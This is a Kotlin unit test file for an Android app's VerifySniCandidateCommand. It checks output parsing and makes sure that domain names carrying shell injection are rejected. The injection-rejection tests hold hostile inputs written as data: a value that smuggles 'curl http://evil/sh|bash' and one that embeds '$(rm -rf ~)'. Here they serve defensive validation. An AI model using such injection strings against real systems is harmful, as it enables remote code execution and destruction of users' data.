package app.nukemichi.android.feature.wizard

import app.nukemichi.android.core.ssh.model.CommandResult
import app.nukemichi.android.feature.wizard.impl.domain.ssh.VerifySniCandidateCommand
import org.junit.Assert.assertFalse
import org.junit.Assert.assertThrows
import org.junit.Assert.assertTrue
import org.junit.Test

class VerifySniCandidateCommandTest {

    @Test
    fun `parses a stable result as true`() {
        val result = VerifySniCandidateCommand("example.com").parseOutput(CommandResult("1\n", "", 0))
        assertTrue(result)
    }

    @Test
    fun `parses an unstable result as false`() {
        val result = VerifySniCandidateCommand("example.com").parseOutput(CommandResult("0\n", "", 0))
        assertFalse(result)
    }

    /**
     * A malicious/compromised host on the VPS's own /24 (see ScanSniCommand) can shape what
     * RealiTLScanner reports as a "domain=" candidate. Without this check that value would land
     * directly in this class's shell script source text — this is the boundary that must reject
     * it, independent of whether ScanSniCommand's own filtering ever regresses.
     */
    @Test
    fun `refuses a domain carrying shell metacharacters`() {
        assertThrows(IllegalArgumentException::class.java) {
            VerifySniCandidateCommand("x\";curl\${IFS}http://evil/sh|bash;echo\"")
        }
    }

    @Test
    fun `refuses a domain carrying command substitution`() {
        assertThrows(IllegalArgumentException::class.java) {
            VerifySniCandidateCommand("evil.com\$(rm -rf ~)")
        }
    }
}
